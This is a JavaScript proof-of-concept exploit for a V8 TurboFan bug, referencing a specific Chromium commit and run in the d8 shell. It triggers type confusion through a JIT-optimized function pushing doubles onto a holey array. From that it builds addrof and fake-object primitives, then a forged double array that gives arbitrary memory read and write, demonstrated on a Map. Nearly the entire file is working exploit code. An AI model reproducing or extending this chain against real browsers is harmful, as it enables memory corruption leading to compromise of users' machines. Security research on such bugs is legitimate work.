// Flags: --allow-natives-syntax --turbofan --no-always-turbofan
// commit fe051262efbbd92479a08436f733eba9f756e008 M133
// https://chromium-review.googlesource.com/c/v8/v8/+/6321930

d8.file.execute('./helper.js');

const helper = new Helper();

// 0x0018cf59 0x0018d1cd   0x0019961d
let fp = helper.pair_i32_to_f64(0x00480021, 0x00400021);
// console.log(fp);

function hex(x){
  return "0x" + x.toString(16);
}

const faker = new Array(0x10000);
faker.fill(0.0);

// JSArray  arr = [{},,]
faker[1] = helper.pair_i32_to_f64(0x0018d92d, 0x00000745)   // 0x00480020 (map, properties)
faker[2] = helper.pair_i32_to_f64(0x00480031, 0x2);         // 0x00480028 (element, length)
faker[3] = helper.pair_i32_to_f64(0x00000565, 0x2);         // 0x00480030 (element_map, length)


//%DebugPrint(faker);

var fake_obj_arr;

function tigger() {
 
  function jit(v2, v3) {
    var v4 = v3[0];

    var v5 = v2[0];

    Array.prototype.push.call(v3, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307,1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307,1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307,1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307,1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307,1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307,1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307,1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307, 1.780115109359691e-307);
  }

  %PrepareFunctionForOptimization(jit);
  const holey = new Array(1);
  holey[0] = 'tagged'; // HOLEY_ELEMENTS
  jit(holey, [1]);

  const holey_double = new Array(1);
  holey_double[0] = 0.1; // HOLEY_DOUBLE_ELEMENTS
  %OptimizeFunctionOnNextCall(jit);
  jit(holey_double, holey_double);

  fake_obj_arr = holey_double[2];

}



tigger();
tigger();


function addrof(obj){
  fake_obj_arr[0] = obj;
  return helper.ftoil(faker[4]) - 1;
}

function fake_obj(addr){
  faker[4] = helper.pair_i32_to_f64(addr, 0);
  return fake_obj_arr[0];
}



var arraybuffer = new ArrayBuffer(0x10000);
var dv = new DataView(arraybuffer);
dv.setUint32(0,0xdeadbeef,true);

var arraybuffer_addr = addrof(arraybuffer);

// FixedDoubleArray, arr = [1.1]
faker[5] = helper.pair_i32_to_f64(0x0018d861, 0x00000745);  //0x00480040
faker[6] = helper.pair_i32_to_f64(0x00480051, 0x7ffffffe)   //0x00480048
faker[7] = helper.pair_i32_to_f64(0x000008a1, 0x7ffffffe)   //0x00480050



var fake_double_array = fake_obj(0x00480040 + 1);


function abr_read(addr){
  faker[6] = helper.pair_i32_to_f64(addr - 0x8 + 1, 0x7ffffffe);
  return [helper.ftoil(fake_double_array[0]), helper.ftoih(fake_double_array[0])];
}

function abr_write(addr, value){
  let u32 = abr_read(addr);
  let low = u32[0];
  let high = u32[1];

  faker[6] = helper.pair_i32_to_f64(addr - 0x8 + 1, 0x7ffffffe);
  fake_double_array[0] = helper.pair_i32_to_f64(value, high);
}




function print_addr(obj){
  console.log("addr: ", hex(addrof(obj) + 1));
}


function read_value_u32(addr){
  let u32 = abr_read(addr);
  let low = u32[0];
  let high = u32[1];
  console.log("low: ", hex(low), " high: ",hex(high))
}


let map = new Map();
print_addr(map);
read_value_u32(addrof(map) + 0x4);
abr_write(addrof(map) + 0x8, 0x745);
%DebugPrint(map);
